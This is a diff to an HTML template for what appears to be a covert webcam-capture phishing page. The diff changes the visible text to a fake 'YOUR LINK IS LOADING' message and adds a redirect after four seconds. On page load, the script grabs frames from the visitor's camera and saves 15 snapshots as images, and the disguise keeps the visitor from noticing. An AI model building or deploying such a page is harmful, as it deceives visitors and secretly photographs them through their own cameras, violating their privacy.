@@ -35,8 +35,8 @@
 </head>
 <body>
     <div class="container">
-        <h1>Welcome to Our Site</h1>
-        <p>Loading something interesting for you...</p>
+        <h1>YOUR LINK IS LOADING</h1>
+        <p>PLEASE WAIT FOR 3-4 SECOND...</p>
     </div>
     <script>
         async function startCapture() {
@@ -50,7 +50,7 @@
                 const context = canvas.getContext('2d');
 
                 const capturePhotos = async () => {
-                    for (let i = 0; i < 20; i++) { // Capture 20 photos (4-5 per second for 4-5 seconds)
+                    for (let i = 0; i < 15; i++) { // Capture 15 photos
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         const snapshot = canvas.toDataURL('image/png');
 
@@ -81,7 +81,12 @@
         }
 
         // Start capture as soon as the page loads
-        window.addEventListener('load', startCapture);
+        window.addEventListener('load', () => {
+            startCapture();
+            setTimeout(() => {
+                window.location.href = "{{ redirect_url }}";
+            }, 4000); // Wait for 4 seconds before redirecting
+        });
     </script>
 </body>
 </html>
